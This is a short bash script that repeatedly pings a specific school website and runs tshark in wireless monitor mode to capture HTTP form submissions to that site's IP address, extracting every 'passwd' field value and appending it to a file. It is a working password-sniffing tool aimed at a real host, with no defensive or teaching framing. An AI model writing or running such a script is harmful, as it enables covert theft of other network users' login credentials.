#! /bin/bash
while True;
	do
	clear
	if ping -o www.alevel.com.cn; then
		gtimeout 60 tshark -i en0 -I -f 'dst host 210.22.15.252' -Y 'urlencoded-form.key == "passwd"' -Tfields -e 'urlencoded-form.value' >>namelist.txt 
		
	fi
done
